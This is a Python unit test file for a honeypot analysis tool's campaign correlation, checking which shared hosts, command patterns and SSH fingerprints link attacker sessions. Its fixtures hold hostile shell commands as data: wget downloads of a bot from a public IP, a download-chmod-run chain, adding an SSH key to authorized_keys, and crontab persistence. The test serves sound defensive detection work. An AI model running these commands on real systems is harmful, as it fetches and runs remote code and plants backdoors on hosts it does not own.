# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2026 The LanPulse authors
"""Campaign correlation must link real shared infrastructure and ignore what every bot shares."""
import os
import pathlib
import sys
import tempfile
import types
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "tests"))

import honeyanalysis as ha  # noqa: E402
from test_honeyanalysis import FakeHp  # noqa: E402


class CampaignAccuracy(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        nm = types.SimpleNamespace(args=types.SimpleNamespace(demo=False), data_dir=pathlib.Path(self.tmp.name),
                                   notify_plain=lambda *a: None)
        self.h = ha.HoneyAnalysis(nm, FakeHp())

    def tearDown(self):
        self.h.db.close()
        self.tmp.cleanup()

    def s(self, sid, ip, cmds, **kw):
        p = {"session": sid, "ip": ip, "port": 22, "proto": "ssh", "sensor": "pi",
             "logins": [{"u": "root", "p": "x", "ok": True}], "commands": cmds, "files": []}
        p.update(kw)
        self.h.add_session(p)

    def values(self):
        return {(c["kind"], c["value"]): c for c in self.h.campaigns(24)["campaigns"]}

    def test_shared_payload_host_is_linked(self):
        self.s("p1", "198.51.100.20", ["wget http://45.9.148.77/bot"])
        self.s("p2", "198.51.100.21", ["wget http://45.9.148.77/bot"])
        self.assertIn(("Public IP", "45.9.148.77"), self.values())

    def test_ip_lookup_services_and_cloud_subdomains_do_not_link_bots(self):
        self.s("i1", "198.51.100.5", ["curl icanhazip.com"])
        self.s("i2", "198.51.100.6", ["curl icanhazip.com"])
        self.s("a1", "198.51.100.7", ["curl https://cdn.github.com/x -o x"])
        self.s("a2", "198.51.100.8", ["curl https://cdn.github.com/y -o y"])
        self.assertEqual([k for k in self.values() if k[0] == "Domain"], [])

    def test_a_generic_downloader_chain_is_not_a_pattern(self):
        chain = ["uname -a", "wget http://45.9.148.%d/a -O a", "chmod +x a", "./a", "rm -rf a"]
        self.s("g1", "198.51.100.1", [chain[0], chain[1] % 5, *chain[2:]])
        self.s("g2", "198.51.100.2", [chain[0], chain[1] % 6, *chain[2:]])
        self.assertEqual([k for k in self.values() if k[0] == "Behavior pattern"], [])

    def test_a_distinctive_shared_pattern_still_counts(self):
        cmds = ["uname -a", "echo 'ssh-rsa AAAA x' >> ~/.ssh/authorized_keys", "crontab -r; echo '* * * * * /tmp/x' | crontab -"]
        self.s("d1", "198.51.100.1", cmds)
        self.s("d2", "198.51.100.2", cmds)
        self.assertTrue(any(k[0] == "Behavior pattern" for k in self.values()))

    def test_a_widely_shared_ssh_fingerprint_is_low_confidence(self):
        for n in range(12):
            self.s("h%d" % n, "192.0.2.%d" % (n + 1), ["ls"], hassh="c" * 32)
        self.s("x1", "192.0.2.100", ["ls"], hassh="d" * 32)
        self.s("x2", "192.0.2.101", ["ls"], hassh="d" * 32)
        v = self.values()
        self.assertEqual(v[("SSH client fingerprint", "c" * 32)]["confidence"], "low")
        self.assertEqual(v[("SSH client fingerprint", "d" * 32)]["confidence"], "moderate")


if __name__ == "__main__":
    unittest.main()
